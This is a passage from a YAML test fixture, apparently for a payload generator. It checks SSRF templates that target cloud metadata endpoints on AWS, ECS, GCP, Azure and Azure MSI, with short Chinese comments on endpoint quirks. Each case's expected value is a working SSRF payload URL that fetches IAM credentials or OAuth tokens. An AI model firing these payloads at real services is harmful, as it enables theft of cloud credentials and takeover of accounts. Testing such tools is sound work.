      payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"

  - name: ssrf.generic.cloud.metadata · target=aws_ecs
    state:
      vuln: ssrf
      template: ssrf.generic.cloud.metadata
      slots: {target: aws_ecs}
      outputs: [raw]
    expect:
      # ECS 任务元数据在 169.254.170.2，不是通用的 .169.254
      payload: "http://169.254.170.2/v2/metadata"

  - name: ssrf.generic.cloud.metadata · target=gcp
    state:
      vuln: ssrf
      template: ssrf.generic.cloud.metadata
      slots: {target: gcp}
      outputs: [raw]
    expect:
      # 走域名而不是链路本地 IP——所以 GCP 这条在只允许 IP 的 SSRF 里出不来
      payload: "http://metadata.google.internal/computeMetadata/v1/"

  - name: ssrf.generic.cloud.metadata · target=azure
    state:
      vuln: ssrf
      template: ssrf.generic.cloud.metadata
      slots: {target: azure}
      outputs: [raw]
    expect:
      payload: "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

  - name: ssrf.generic.cloud.metadata · target=azure_msi
    state:
      vuln: ssrf
      template: ssrf.generic.cloud.metadata
      slots: {target: azure_msi}
      outputs: [raw]
    expect:
      # resource 参数是第二个查询参数，`&` 必须原样在载荷里（query 提交时才会被编码）
      payload: "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

  - name: ssrf.generic.cloud.metadata · target=oracle
    state:
